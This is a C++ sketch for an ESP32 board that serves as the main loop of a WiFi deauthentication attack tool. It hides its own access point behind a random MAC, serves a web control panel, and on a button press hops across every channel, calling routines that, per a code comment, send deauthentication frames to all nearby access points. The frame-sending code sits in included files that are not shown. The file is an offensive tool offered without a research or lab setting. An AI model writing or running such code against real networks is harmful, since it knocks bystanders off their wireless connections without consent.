#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "web_interface.h"
#include "web_interface.cpp"
#include "deauth.h"
#include "definitions.h"
#include "esp_task_wdt.h"

int curr_channel = 1;
bool buttonPreviouslyPressed = false;

void blinkOnce() {
  digitalWrite(ledPin, LOW);   // light up
  delay(50);                  
  digitalWrite(ledPin, HIGH);  // turn off
}
void stopAP() {
  WiFi.disconnect();
}

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  WiFi.mode(WIFI_MODE_AP);
  setRndMac();
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
  WiFi.softAP(AP_SSID, AP_PASS, 1, true, 2); //hide SSID
  DEBUG_PRINTF("AP started\n");
  start_web_interface();
  delay(50);
  DEBUG_PRINTF("Web service started\n");
  DEBUG_PRINTF("AP Using MAC: ");
  DEBUG_PRINTLN(WiFi.softAPmacAddress());

  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);       // HIGH is off
  pinMode(buttonPin, INPUT_PULLUP); // BOOT button -> GND
  delay(50);
  blinkOnce();
}

void loop() {
  bool buttonNowPressed = (digitalRead(buttonPin) == LOW); // LOW means button is pressed
  // check if it was just pressed
  if (buttonNowPressed && !buttonPreviouslyPressed) {
    deauth_type = DEAUTH_TYPE_ALL;
    blinkOnce();
    DEBUG_PRINTF("Now Deauth All APs. WebUI will be shut down\n");
    handle_deauth_all();
  }

  // update status
  buttonPreviouslyPressed = buttonNowPressed;

  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    deauth_all();  // Perform scan and send deauth frames
    curr_channel++;
    delay(10);
  } else {
    web_interface_handle_client();
  }
}